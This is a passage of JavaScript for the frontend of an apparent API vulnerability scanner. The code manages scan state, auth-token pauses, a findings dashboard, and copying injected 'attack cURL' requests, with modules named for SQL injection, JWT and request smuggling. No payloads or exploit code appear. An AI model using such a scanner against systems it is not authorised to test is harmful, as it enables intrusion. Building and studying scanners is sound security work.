// ── API Scan Tester Frontend ──────────────────────────────────────────────────
"use strict";

const AS_BASE = "http://127.0.0.1:8775";

// ── State ─────────────────────────────────────────────────────────────────────
let _asEntries      = [];      // [{id, method, url, headers, body}]
let _asChecked      = {};      // {id: bool}
let _asFilterText   = "";
let _asMethodFilter = "";
let _asJobId        = null;
let _asPollTimer    = null;
let _asResults      = null;
let _asSevFilter    = "ALL";
let _asHideFP       = true;    // hide confirmed===false (Likely FP) by default; Unverified stays visible
let _asCurrentTab   = "capture";
let _asProfile      = "full";
let _asThreads      = 6;
let _asTimeout      = 10;
let _asDelaySec     = 0;
let _asModuleKeys   = [];      // all module keys from backend
let _asProfilesMap  = {};      // profile → [module keys]
let _asModuleSel    = {};      // {moduleKey: bool}
let _asModulesCustom = false;  // true once user toggles a chip (send explicit modules)
let _asExpanded     = {};      // {rowIdx: bool} for results table expand

// Probe list state
let _asProbes        = [];     // all probes accumulated [{id,method,url,status,...}]
let _asProbeOffset   = 0;      // incremental fetch cursor
let _asLogOffset     = 0;      // incremental log fetch cursor (delta polling)
let _asSelProbeId    = null;   // which probe row is currently selected
let _asFirstIssueSeen  = false; // has the first live issue already triggered a notification?
let _asProbeAutoScroll = true;  // false when user manually scrolled up in the probe list
let _asProbeFilter    = "all"; // active probe-type filter: all|header|query|body|path
let _asProbeModuleFilter = "all"; // active Module/Category filter: all|<module key, e.g. sqli, jwt, smuggling>
let _asProbeModuleSeen   = new Set(); // distinct module keys seen so far (for dropdown options)
let _asProbeSearch       = ""; // active probe search query (URL, parameter, method)
let _asProbeSearchTimer  = null;

// Stop / Resume / Done state
let _asScanState        = "idle";  // "idle" | "running" | "paused_auth" | "stopped" | "done"
let _asAuthPauseNotified = false;  // toast once when entering paused_auth
let _asScanEntriesSaved = [];      // full entry list for Resume
let _asScanCustomsSaved = [];      // customValues for Resume
let _asProbeIdOffset    = 0;       // added to backend probe IDs when resuming, so rows don't conflict

// Params modal state
let _asParamsList       = [];  // [{entry_id, param_name, location, current_value, ...}]
let _asCheckedEntries   = [];  // entries queued for scan (saved while modal is open)
let _asParamCustomVals  = {};  // {`${entry_id}:${param_name}`: value}

// Results detail panel state
let _asSelResultIdx    = null;  // index into current filtered list, or null
let _asSelResultCurl   = "";    // cURL for the currently selected issue row
// Module-level text buffers for the detail panels (more robust than dataset API)
let _asRdRaw  = {req: "", resp: ""};   // plain text — used by _asRdSearch
let _asRdBase = {req: "", resp: ""};   // HTML with payload marks — base display

// ── Persistent results accumulator ────────────────────────────────────────────
// Survives across multiple scan jobs in the same session.
// Each completed job's entries_done are appended here.
// Only asReset() clears this, giving Burp-like "append until Reset" behaviour.
let _asAllEntriesDone = [];

// ── URL-status tracking (for capture-tab badges & warnings) ──────────────────
// Explicitly maintained Sets so badge logic is O(1) and doesn't rely on
// ad-hoc URL comparisons over _asAllEntriesDone.
// _asScannedUrls  — base URLs that COMPLETED at least one scan
// _asScanningUrls — base URLs currently in the active job queue (queued OR scanning)
let _asScannedUrls  = new Set();   // cleared only by asReset()
let _asScanningUrls = new Set();   // cleared when job finishes / stopped

const _AS_STATIC_EXTS = /\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|webp|zip|mp4|mp3)(\?.*)?$/i;

// Strip query-string + trailing slash to produce a stable key for URL-status sets
function _asUrlKey(url) {
  return (url || "").split("?")[0].replace(/\/+$/, "");
}

// ── Tab switching ─────────────────────────────────────────────────────────────
function asSwitchTab(tab) {
  _asCurrentTab = tab;
  ["capture", "scanning", "results", "dashboard"].forEach(t => {
    const btn = document.getElementById(`as-tab-${t}`);
    const pnl = document.getElementById(`as-panel-${t}`);
    if (btn) btn.classList.toggle("active", t === tab);
    if (pnl) pnl.style.display = t === tab ? "flex" : "none";
  });
  if (tab === "capture")   _asRenderList();
  if (tab === "dashboard") _asRenderDashboard();
}

// ── Toast ─────────────────────────────────────────────────────────────────────
function _asShowToast(msg, duration) {
  duration = duration || 2500;
  let el = document.getElementById("as-toast");
  if (!el) {
    el = document.createElement("div"); el.id = "as-toast";
    document.body.appendChild(el);
  }
  el.textContent = msg;
  el.style.opacity = "1"; el.style.display = "block";
  clearTimeout(el._timer);
  el._timer = setTimeout(() => {
    el.style.opacity = "0";
    setTimeout(() => { el.style.display = "none"; }, 300);
  }, duration);
}

// ── Stop / Resume / Done button ───────────────────────────────────────────────
function _asUpdateStopBtn(state) {
  _asScanState = state;
  const btn = document.getElementById("as-stop-btn");
  if (!btn) return;
  btn.disabled = false;
  btn.style.removeProperty("opacity");
  switch (state) {
    case "idle":
      btn.textContent = "⏹ Stop";
      btn.disabled    = true;
      btn.style.opacity = "0.4";
      btn.onclick = null;
      return;
    case "running":
      btn.textContent = "⏹ Stop";
      btn.style.background    = "rgba(218,54,51,.15)";
      btn.style.color         = "var(--red2)";
      btn.style.borderColor   = "rgba(218,54,51,.3)";
      btn.onclick = asStopScan;
      break;
    case "paused_auth":
      btn.textContent = "⏹ Stop";
      btn.style.background    = "rgba(255,179,71,.18)";
      btn.style.color         = "#ffb347";
      btn.style.borderColor   = "rgba(255,179,71,.45)";
      btn.onclick = asStopScan;
      break;
    case "stopped":
      btn.textContent = "▶ Resume";
      btn.style.background    = "rgba(63,185,80,.15)";
      btn.style.color         = "var(--green)";
      btn.style.borderColor   = "rgba(63,185,80,.35)";
      btn.onclick = asResumeScan;
      break;
    case "done":
      btn.textContent = "✅ Done";
      btn.style.background    = "rgba(63,185,80,.10)";
      btn.style.color         = "var(--green)";
      btn.style.borderColor   = "rgba(63,185,80,.25)";
      btn.disabled = true;
      btn.style.opacity = "0.6";
      btn.onclick = null;
      break;
  }
}

function _asShowAuthBanner(reason) {
  const el = document.getElementById("as-auth-banner");
  if (!el) return;
  el.style.display = "flex";
  const r = document.getElementById("as-auth-banner-reason");
  if (r) r.textContent = reason || "Paste a fresh Authorization token to continue the scan.";
  const inp = document.getElementById("as-auth-token-input");
  if (inp && !inp.value) setTimeout(() => inp.focus(), 80);
}

function _asHideAuthBanner() {
  const el = document.getElementById("as-auth-banner");
  if (el) el.style.display = "none";
  _asAuthPauseNotified = false;
}

async function asResumeWithAuth() {
  if (!_asJobId) return;
  const tok = (document.getElementById("as-auth-token-input")?.value || "").trim();
  const cookie = (document.getElementById("as-auth-cookie-input")?.value || "").trim();
  if (!tok && !cookie) {
    _asShowToast("Paste Authorization token or Cookie first");
    return;
  }
  const btn = document.querySelector(".as-auth-resume-btn");
  if (btn) { btn.disabled = true; btn.textContent = "Resuming…"; }
  try {
    const body = {};
    if (tok) body.authorization = tok;
    if (cookie) body.cookie = cookie;
    const r = await fetch(`${AS_BASE}/apiscan/update_auth/${_asJobId}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!r.ok) {
      const e = await r.json().catch(() => ({}));
      alert("Auth update failed: " + (e.detail || r.statusText));
      return;
    }
    _asHideAuthBanner();
    _asUpdateStopBtn("running");
    _asShowToast("Token updated — scan resuming");
    asSwitchTab("scanning");
  } catch (e) {
    alert("Cannot contact backend: " + e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = "▶ Resume"; }
  }
}
window.asResumeWithAuth = asResumeWithAuth;

async function asSkipAuthPause() {
  if (!_asJobId) return;
  const btn = document.querySelector(".as-auth-skip-btn");
  if (btn) { btn.disabled = true; btn.textContent = "Skipping…"; }
  try {
    const r = await fetch(`${AS_BASE}/apiscan/skip_auth/${_asJobId}`, { method: "POST" });
    if (!r.ok) {
      const e = await r.json().catch(() => ({}));
      alert("Skip failed: " + (e.detail || r.statusText));
      return;
    }
    _asHideAuthBanner();
    _asUpdateStopBtn("running");
    _asShowToast("Auth pause skipped — scan continues without asking again");
    asSwitchTab("scanning");
  } catch (e) {
    alert("Cannot contact backend: " + e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = "⏭ Skip"; }
  }
}
window.asSkipAuthPause = asSkipAuthPause;

// ── UUID ──────────────────────────────────────────────────────────────────────
function _asUUID() {
  return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
}

// ── HTML escape ───────────────────────────────────────────────────────────────
function _asEsc(s) {
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;")
                  .replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

// ── Payload highlight ─────────────────────────────────────────────────────────
// Finds all occurrences of payloadStr inside rawText (case-sensitive, literal)
// and wraps them in <mark class="as-payload-mark">…</mark>.
// Everything is HTML-escaped; the mark is injected AFTER escaping each segment
// so the payload itself is safe even if it contains HTML special chars.
function _asHighlightPayload(rawText, payloadStr) {
  const s = String(rawText || "");
  const p = String(payloadStr || "").trim();
  if (!p || p.length < 2) return _asEsc(s);   // too short to be useful
  const parts = [];
  const pEsc  = _asEsc(p);
  let last = 0, i;
  while ((i = s.indexOf(p, last)) !== -1) {
    parts.push(_asEsc(s.slice(last, i)));
    parts.push(`<mark class="as-payload-mark">${pEsc}</mark>`);
    last = i + p.length;
  }
  parts.push(_asEsc(s.slice(last)));
  return parts.join("");
}

// ── Dashboard state ───────────────────────────────────────────────────────────
let _asDashSelVuln   = null;   // currently selected vulnerability key (parameter name)
let _asDashSevF      = "ALL";  // severity filter for left panel
let _asDashSearchQ   = "";     // text filter for left panel
let _asDashPillData  = {};     // pillId → { entry, iss } for click-to-copy-cURL on param pills

const _AS_SEV_ORDER  = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
const _AS_SEV_COL    = { CRITICAL:"#ff4444", HIGH:"#ff8800", MEDIUM:"#e3b341", LOW:"#58a6ff", INFO:"#8b949e" };
const _AS_SEV_BG     = { CRITICAL:"rgba(248,81,73,.18)", HIGH:"rgba(255,136,0,.15)", MEDIUM:"rgba(227,179,65,.13)", LOW:"rgba(88,166,255,.13)", INFO:"rgba(139,148,158,.10)" };

// ── Dashboard map ─────────────────────────────────────────────────────────────
// Grouping strategy:
//  • Passive check (no payload) → group by PARAMETER  (e.g. "X-Content-Type-Options")
//  • Active (has payload)       → group by VULNERABILITY TYPE (e.g. "SSRF", "IDOR…")
//
// Map key: "p::<param>" for passive, "v::<vuln>" for active
// This keeps passive header checks separate from active injection findings.
function _asDashBuildMap() {
  const map = {};
  const entries = (_asResults && _asResults.entries_done) || _asAllEntriesDone || [];
  entries.forEach(ed => {
    const entry  = ed.entry || {};
    let m = entry.method || "";
    let u = entry.url    || "";
    if (!m && u) {
      const mx = u.match(/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(https?:\/\/.+)$/i);
      if (mx) { m = mx[1].toUpperCase(); u = mx[2]; }
    }
    const normEntry = { ...entry, method: m || "GET", url: u };

    (ed.issues || []).forEach(iss => {
      // Dashboard shows only REAL issues — skip confirmed false positives
      if (iss.confirmed === false) return;

      const rawPl   = (iss.payload || "").trim();
      const isNA    = !rawPl || rawPl.toUpperCase() === "N/A";
      const param   = (iss.parameter   || "").trim() || "(no parameter)";
      const vuln    = (iss.vulnerability|| "").trim() || "Unknown";
      const sev     = (iss.severity    || "INFO").toUpperCase();

      // Key & display label
      const key     = isNA ? `p::${param}` : `v::${vuln}`;
      const label   = isNA ? param : vuln;   // shown as main heading in left panel
      const sub     = isNA ? vuln  : "";     // shown as subtitle for passive entries

      if (!map[key]) {
        map[key] = {
          key, label, sub,
          isPassive: isNA,
          maxSev:    sev,
          params:    new Set(),   // unique parameter names (for active: origin, referer…)
          apis:      new Set(),
          issues:    [],
        };
      }
      const grp = map[key];
      if ((_AS_SEV_ORDER[sev] ?? 4) < (_AS_SEV_ORDER[grp.maxSev] ?? 4)) grp.maxSev = sev;
      grp.apis.add(_asUrlKey(u));
      if (!isNA && param !== "(no parameter)") {
        if (param.includes(",")) {
          param.split(",").map(p => p.trim()).filter(Boolean).forEach(p => grp.params.add(p));
        } else {
          grp.params.add(param);
        }
      }
      grp.issues.push({ entry: normEntry, iss });
    });
  });
  return map;
}

function _asRenderDashboard() {
  const map     = _asDashBuildMap();
  const entries = (_asResults && _asResults.entries_done) || _asAllEntriesDone || [];
  const totalIssues = Object.values(map).reduce((s, v) => s + v.issues.length, 0);
  const totalApis   = new Set(entries.map(ed => _asUrlKey(ed.entry?.url || "")).filter(Boolean)).size;

  const metaEl = document.getElementById("as-dash-meta");
  if (metaEl) metaEl.textContent =
    `${totalIssues} issue${totalIssues !== 1 ? "s" : ""} · ${totalApis} API${totalApis !== 1 ? "s" : ""} · ${Object.keys(map).length} unique vulnerabilities`;

  const listEl = document.getElementById("as-dash-vuln-list");
  const cntEl  = document.getElementById("as-dash-vuln-count");
  if (!listEl) return;

  if (!totalIssues) {
    listEl.innerHTML = `<div style="padding:30px 16px;text-align:center;color:var(--text3);font-size:11px">No results yet — run a scan first.</div>`;
    if (cntEl) cntEl.textContent = "";
    return;
  }

  _asDashRenderVulnList(map);

  if (_asDashSelVuln && map[_asDashSelVuln]) {
    _asDashShowApis(map, _asDashSelVuln);
  } else {
    const sorted = _asDashSortedVulns(map);
    if (sorted.length) {
      _asDashSelVuln = sorted[0].key;
      _asDashShowApis(map, _asDashSelVuln);
    }
  }
}

function _asDashSortedVulns(map) {
  return Object.values(map)
    .filter(v => {
      if (_asDashSevF !== "ALL" && v.maxSev !== _asDashSevF) return false;
      if (_asDashSearchQ) {
        const q = _asDashSearchQ.toLowerCase();
        if (!v.label.toLowerCase().includes(q) && !v.sub.toLowerCase().includes(q)) return false;
      }
      return true;
    })
    .sort((a, b) => {
      const sd = (_AS_SEV_ORDER[a.maxSev] ?? 4) - (_AS_SEV_ORDER[b.maxSev] ?? 4);
      return sd !== 0 ? sd : b.issues.length - a.issues.length;
    });
}

function _asDashRenderVulnList(map) {
  const listEl = document.getElementById("as-dash-vuln-list");
  const cntEl  = document.getElementById("as-dash-vuln-count");
  if (!listEl) return;

  const sorted = _asDashSortedVulns(map);
  if (cntEl) cntEl.textContent = `${sorted.length}`;

  if (!sorted.length) {
    listEl.innerHTML = `<div style="padding:20px 16px;text-align:center;color:var(--text3);font-size:11px">No match</div>`;
    return;
  }

  listEl.innerHTML = sorted.map(v => {
    const col    = _AS_SEV_COL[v.maxSev] || "#8b949e";
    const bg     = _AS_SEV_BG[v.maxSev]  || "rgba(139,148,158,.10)";
    const isSel  = v.key === _asDashSelVuln;
    const apiCnt = v.apis.size;
    const issCnt = v.issues.length;

    // Subtitle row:
    // Active → show parameter tags (origin, referer, clientid…), overflow with +N
    // Passive → show vulnerability type in bold
    let subtitle = "";
    if (v.isPassive) {
      subtitle = `<div class="as-dash-vuln-type"><strong>${_asEsc(v.sub)}</strong></div>`;
    } else {
      const tags    = [...v.params].slice(0, 3)
        .map(p => `<span class="as-dash-param-tag" title="${_asEsc(p)}">${_asEsc(p)}</span>`).join("");
      const overflow = v.params.size > 3
        ? `<span class="as-dash-param-more">+${v.params.size - 3}</span>` : "";
      subtitle = `<div class="as-dash-vuln-params">${tags}${overflow}</div>`;
    }

    // Safe key for onclick attribute
    const safeKey = _asEsc(v.key).replace(/'/g, "&#39;");
    return `<div class="as-dash-vuln-item${isSel ? " selected" : ""}"
                 onclick="_asDashSelectVuln('${safeKey}')">
      <div class="as-dash-vuln-sev" style="background:${bg};color:${col};border-color:${col}40">${v.maxSev}</div>
      <div class="as-dash-vuln-info">
        <div class="as-dash-vuln-name" title="${_asEsc(v.label)}">${_asEsc(v.label)}</div>
        ${subtitle}
      </div>
      <div class="as-dash-vuln-counts">
        <span class="as-dash-count-pill" style="color:${col}">${issCnt}</span>
        <span class="as-dash-api-pill">${apiCnt} API${apiCnt !== 1 ? "s" : ""}</span>
      </div>
    </div>`;
  }).join("");
}

function _asDashSelectVuln(key) {
  _asDashSelVuln = key;
  const map = _asDashBuildMap();
  _asDashRenderVulnList(map);
  _asDashShowApis(map, key);
}

function _asDashShowApis(map, key) {
  const v           = map[key];
  const placeholder = document.getElementById("as-dash-api-placeholder");
  const content     = document.getElementById("as-dash-api-content");
  if (!content) return;
  if (placeholder) placeholder.style.display = "none";
  content.style.display = "block";

  // Clear stale pill data to avoid memory growth across re-renders
  _asDashPillData = {};

  if (!v) { content.innerHTML = ""; return; }

  const col = _AS_SEV_COL[v.maxSev] || "#8b949e";
  const bg  = _AS_SEV_BG[v.maxSev]  || "rgba(139,148,158,.10)";

  // Group issues by entry URL
  const byUrl = {};
  v.issues.forEach(({ entry, iss }) => {
    const urlKey = `${entry.method}::${entry.url}`;
    if (!byUrl[urlKey]) byUrl[urlKey] = { entry, issues: [] };
    byUrl[urlKey].issues.push(iss);
  });

  const apiEntries = Object.values(byUrl);

  // Subtitle in header: for active show unique params; for passive show vuln type
  const hdrSub = v.isPassive
    ? `<span class="as-dash-api-hdr-vuln" title="${_asEsc(v.sub)}">${_asEsc(v.sub)}</span>`
    : [...v.params].slice(0, 5).map(p => `<span class="as-dash-param-tag" style="font-size:10px" title="${_asEsc(p)}">${_asEsc(p)}</span>`).join("") +
      (v.params.size > 5 ? ` <span class="as-dash-param-more">+${v.params.size - 5}</span>` : "");

  content.innerHTML = `
    <div class="as-dash-api-hdr">
      <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
          <span class="as-dash-api-hdr-badge" style="background:${bg};color:${col};border-color:${col}40">${v.maxSev}</span>
          <span class="as-dash-api-hdr-param">${_asEsc(v.label)}</span>
          ${hdrSub}
        </div>
        <button class="as-dash-copy-btn" onclick="_asDashCopyUrls()" title="Copy all affected API URLs">
          📋 Copy All URLs
        </button>
      </div>
      <div style="display:flex;gap:14px;margin-top:6px">
        <span class="as-dash-stat"><span style="color:${col};font-weight:700">${v.issues.length}</span> issue${v.issues.length !== 1 ? "s" : ""}</span>
        <span class="as-dash-stat"><span style="color:var(--text);font-weight:700">${apiEntries.length}</span> API${apiEntries.length !== 1 ? "s" : ""} affected</span>
      </div>
    </div>
    <div class="as-dash-api-cards">
      ${apiEntries.map(({ entry, issues }) => {
        const mCls = `method-badge method-${(entry.method || "GET").toUpperCase()}`;
        let urlDisp = entry.url || "";
        try {
          const uo = new URL(urlDisp);
          urlDisp = uo.pathname + (uo.search ? uo.search.slice(0, 60) + (uo.search.length > 60 ? "…" : "") : "");
        } catch {}

        // Unique parameters that triggered this vulnerability in this API
        // Each pill click copies the exact probed cURL (with payload injected)
        const entryParams = [...new Set(issues.flatMap(iss => {
          const raw = (iss.parameter || "").trim();
          return raw.includes(",") ? raw.split(",").map(x => x.trim()).filter(Boolean) : [raw];
        }).filter(Boolean))];
        const paramPills  = !v.isPassive && entryParams.length
          ? `<div class="as-dash-card-params">${entryParams.map(p => {
              const matchIss = issues.find(iss => {
                const ip = (iss.parameter || "").trim();
                return ip === p || ip.split(",").map(x => x.trim()).includes(p);
              }) || issues[0];
              const pillId   = `dp_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
              _asDashPillData[pillId] = { entry, iss: matchIss };
              return `<span class="as-dash-param-pill as-dash-pill-copyable"
                           style="border-color:${col}40;color:${col}"
                           onclick="_asDashCopyParamCurl('${pillId}')"
                           title="Click to copy cURL · param: ${_asEsc(p)}">${_asEsc(p)} <span class="as-dash-pill-icon">⎘</span></span>`;
            }).join("")}</div>`
          : "";

        return `<div class="as-dash-api-card">
          <div class="as-dash-card-url">
            <span class="${mCls}">${_asEsc(entry.method || "GET")}</span>
            <span class="as-dash-full-url" title="${_asEsc(entry.url || "")}">${_asEsc(urlDisp)}</span>
            <span class="as-dash-card-cnt" style="color:${col}">${issues.length} issue${issues.length !== 1 ? "s" : ""}</span>
          </div>
          ${paramPills}
        </div>`;
      }).join("")}
    </div>`;
}

// Copy all affected API URLs for the currently selected vulnerability group
function _asDashCopyUrls() {
  const map = _asDashBuildMap();
  const v   = _asDashSelVuln ? map[_asDashSelVuln] : null;
  if (!v) { _asShowToast("No vulnerability selected"); return; }

  // Dedupe by method+url
  const seen = new Set();
  const lines = [];
  v.issues.forEach(({ entry }) => {
    const k = `${entry.method}  ${entry.url}`;
    if (!seen.has(k)) { seen.add(k); lines.push(k); }
  });

  const text = lines.join("\n");
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(
      () => _asShowToast(`📋 ${lines.length} URL${lines.length !== 1 ? "s" : ""} copied`),
      () => _asFallbackCopy(text)
    );
  } else {
    _asFallbackCopy(text);
  }
}

// Copy the exact attack cURL (forged/injected request) for a parameter pill click
function _asDashCopyParamCurl(pillId) {
  const data = _asDashPillData[pillId];
  if (!data || !data.iss) { _asShowToast("Issue data not found"); return; }

  const { entry, iss } = data;
  const attack = _asBuildAttackRequest(entry || {}, iss);
  const curl = _asBuildCurlFromEntry(attack);
  if (!curl) { _asShowToast("Could not build cURL"); return; }

  const label = (iss.parameter || "").trim() || "param";
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(curl).then(
      () => _asShowToast(`⎘ Attack cURL copied — ${label}`),
      () => _asFallbackCopy(curl)
    );
  } else {
    _asFallbackCopy(curl);
    _asShowToast(`⎘ Attack cURL copied — ${label}`);
  }
}

function _asDashSevFilter(sev) {
  _asDashSevF = sev;
  document.querySelectorAll(".as-dash-pill").forEach(p =>
    p.classList.toggle("active", p.dataset.dsev === sev));
  const map = _asDashBuildMap();
  _asDashRenderVulnList(map);
  // If current selection no longer visible, pick first
  const sorted = _asDashSortedVulns(map);
  if (sorted.length && (!_asDashSelVuln || !sorted.find(v => v.key === _asDashSelVuln))) {
    _asDashSelVuln = sorted[0].key;
    _asDashShowApis(map, _asDashSelVuln);
  }
}

function _asDashFilter(q) {
  _asDashSearchQ = q;
  const map = _asDashBuildMap();
  _asDashRenderVulnList(map);
}

// ── Blocking validation alert (in-progress / already-scanned) ─────────────────
// Shows a styled modal with a list of blocked API URLs.
// type: "inprogress" → red border, "scanned" → amber border
function _asShowBlockAlert(title, subtitle, lines, type) {
  const existing = document.getElementById("as-block-alert");
  if (existing) existing.remove();

  const borderCol = type === "inprogress"
    ? "rgba(218,54,51,.45)"
    : "rgba(210,153,34,.45)";
  const btnCol = type === "inprogress"
    ? "background:rgba(218,54,51,.15);color:var(--red2);border:1px solid rgba(218,54,51,.35)"
    : "background:rgba(210,153,34,.15);color:#e3b341;border:1px solid rgba(210,153,34,.35)";
  const badgeCls = type === "inprogress"
    ? "background:rgba(88,166,255,.15);color:#58a6ff;border:1px solid rgba(88,166,255,.3)"
    : "background:rgba(210,153,34,.12);color:#e3b341;border:1px solid rgba(210,153,34,.3)";
  const badgeTxt = type === "inprogress" ? "🔄 IN-PROGRESS" : "✓ SCANNED";
  const icon     = type === "inprogress" ? "🚫" : "⚠️";

  const itemsHtml = lines.map(l =>
    `<div style="display:flex;align-items:flex-start;gap:7px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.05)">
       <span style="flex-shrink:0;font-size:9px;font-weight:700;${badgeCls};border-radius:3px;padding:2px 6px;margin-top:1px">${badgeTxt}</span>
       <span style="font-size:10px;font-family:var(--mono);color:var(--text2);word-break:break-all;line-height:1.5">${_asEsc(l)}</span>
     </div>`
  ).join("");

  const overlay = document.createElement("div");
  overlay.id    = "as-block-alert";
  overlay.style.cssText = "position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.65);backdrop-filter:blur(2px)";
  overlay.innerHTML = `
    <div style="background:var(--bg2);border:1px solid ${borderCol};border-radius:10px;padding:22px 24px;max-width:480px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.6)">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
        <span style="font-size:24px">${icon}</span>
        <div>
          <div style="font-size:13px;font-weight:700;color:var(--text)">${_asEsc(title)}</div>
          <div style="font-size:11px;color:var(--text3);margin-top:3px;line-height:1.5">${_asEsc(subtitle)}</div>
        </div>
      </div>
      <div style="max-height:200px;overflow-y:auto;margin-bottom:16px;border-top:1px solid rgba(255,255,255,.06);padding-top:4px">
        ${itemsHtml}
      </div>
      <div style="display:flex;justify-content:flex-end">
        <button id="as-block-alert-ok"
          style="${btnCol};border-radius:var(--radius);padding:7px 22px;font-size:12px;font-weight:700;cursor:pointer;font-family:var(--sans)">
          OK, Got it
        </button>
      </div>
    </div>`;
  document.body.appendChild(overlay);
  overlay.addEventListener("click", e => { if (e.target === overlay) overlay.remove(); });
  const okBtn = document.getElementById("as-block-alert-ok");
  if (okBtn) okBtn.addEventListener("click", () => overlay.remove());
  // Focus OK button so Enter dismisses it
  setTimeout(() => { if (okBtn) okBtn.focus(); }, 60);
}

// ── Reset ─────────────────────────────────────────────────────────────────────
function asReset() {
  if (_asPollTimer) { clearInterval(_asPollTimer); _asPollTimer = null; }
  if (_asJobId) {
    fetch(`${AS_BASE}/apiscan/stop/${_asJobId}`, {method:"POST"}).catch(()=>{});
  }
  _asEntries     = [];  _asChecked     = {};  _asFilterText  = "";
  _asMethodFilter= "";  _asJobId       = null; _asResults     = null;
  _asSevFilter   = "ALL"; _asProbes    = [];  _asProbeOffset = 0;
  _asLogOffset   = 0;
  _asProbeIdOffset = 0;
  _asSelProbeId  = null;  _asParamsList = [];
  _asCheckedEntries = []; _asParamCustomVals = {}; _asParamRegenMap = {};
  _asSelResultIdx = null; _asSelResultCurl = "";
  _asRdRaw  = {req: "", resp: ""}; _asRdBase = {req: "", resp: ""};
  _asAllEntriesDone = [];   // clear persistent accumulator on full Reset
  _asScannedUrls   = new Set();
  _asScanningUrls  = new Set();
  _asDashSelVuln   = null;
  _asDashSevF      = "ALL";
  _asDashSearchQ   = "";
  _asHideFP        = true;  // reset FP filter to default (hide FPs)
  _asProbeFilter   = "all"; // reset probe type filter
  _asProbeModuleFilter = "all"; _asProbeModuleSeen = new Set(); // reset Module/Category filter
  _asProbeSearch   = ""; // reset probe search query
  const psInp = document.getElementById("as-probe-search");
  if (psInp) psInp.value = "";
  const psClr = document.getElementById("as-probe-search-clear");
  if (psClr) psClr.style.display = "none";
  const _rd = document.getElementById("as-result-detail");
  if (_rd) _rd.style.display = "none";
  _asRenderList();
  _asUpdateScanBtn();
  // Clear scanning + results panels
  const pl = document.getElementById("as-probe-list");
  if (pl) pl.innerHTML = "";
  _asShowProbePlaceholder();
  _asHideAuthBanner();
  _asUpdateStopBtn("idle");
  const tb = document.getElementById("as-results-tbody");
  if (tb) tb.innerHTML = `<tr><td colspan="9" style="text-align:center;padding:30px;color:var(--text3)">No results yet — run a scan first.</td></tr>`;
  const sc = document.getElementById("as-summary-cards");
  if (sc) sc.innerHTML = "";
  const rt = document.getElementById("as-results-title");
  if (rt) rt.textContent = "Results";
  // Hide FP toggle button
  const fpBtn = document.getElementById("as-fp-toggle");
  if (fpBtn) fpBtn.style.display = "none";
  // Reset probe type filter buttons to "All"
  document.querySelectorAll(".as-probe-type-btn").forEach(b =>
    b.classList.toggle("active", b.dataset.type === "all"));
  _asRenderProgress({current:0,total:0,pct:0,api:""}, 0);
  asSwitchTab("capture");
  _asShowToast("Reset complete");
}
// Expose for header btn-clear
window.asReset = asReset;

// ── Entry list ────────────────────────────────────────────────────────────────
function _asLoadEntries(entries) {
  _asEntries = entries; _asChecked = {};
  entries.forEach(e => { _asChecked[e.id] = false; });
  _asRenderList(); _asUpdateScanBtn();
}

function _asRenderList() {
  const wrap  = document.getElementById("as-list-wrap");
  const empty = document.getElementById("as-list-empty");
  if (!wrap) return;

  const ft = (_asFilterText || "").toLowerCase();
  const fm = (_asMethodFilter || "").toUpperCase();
  const filtered = _asEntries.filter(e => {
    if (fm && e.method.toUpperCase() !== fm) return false;
    if (ft && !e.url.toLowerCase().includes(ft)) return false;
    return true;
  });

  const cntEl = document.getElementById("as-endpoint-count");
  if (cntEl) cntEl.textContent = `${filtered.length} endpoint${filtered.length !== 1 ? "s" : ""}`;

  if (filtered.length === 0) {
    wrap.innerHTML = "";
    if (empty) empty.style.display = "flex";
    return;
  }
  if (empty) empty.style.display = "none";

  // ── Always hide the rescan warning banner (in-progress rows lock instead) ──
  const warnEl = document.getElementById("as-rescan-warn");
  if (warnEl) warnEl.style.display = "none";

  // ── Row rendering ─────────────────────────────────────────────────────────
  wrap.innerHTML = filtered.map(e => {
    const key      = _asUrlKey(e.url);
    const scanned  = _asScannedUrls.has(key);
    const scanning = _asScanningUrls.has(key);

    // Only in-progress rows are locked. Scanned rows keep the badge but stay
    // selectable so a different profile / module set can be run on the same API.
    if (scanning && _asChecked[e.id]) { _asChecked[e.id] = false; }

    const chk  = (!scanning && _asChecked[e.id]) ? "checked" : "";
    const mCls = `method-badge method-${e.method.toUpperCase()}`;

    let badge = "";
    if (scanning) {
      badge = `<span class="as-status-badge as-badge-scanning" title="Scan in progress">🔄 In-progress</span>`;
    } else if (scanned) {
      badge = `<span class="as-status-badge as-badge-scanned" title="Already scanned — select again to run another scan type">✓ Scanned</span>`;
    }

    const lockTitle = scanning ? "Scan in progress — cannot re-select" : "";

    // Clicking anywhere on the row toggles the checkbox (in-progress rows are ignored)
    const rowClick = scanning ? "" : `onclick="asToggleCheck('${e.id}',!_asChecked['${e.id}'])"`;
    return `<div class="request-item${scanning ? " as-entry-locked" : ""}" data-id="${e.id}" ${rowClick}${scanning ? ` title="${lockTitle}"` : ""} style="${scanning ? "" : "cursor:pointer"}">
      <input type="checkbox" class="req-checkbox" ${chk}
             ${scanning ? "disabled" : ""}
             onclick="event.stopPropagation()"
             ${scanning ? "" : `onchange="asToggleCheck('${e.id}',this.checked)"`}
             style="margin-top:2px${scanning ? ";cursor:not-allowed;opacity:.35" : ";cursor:pointer"}">
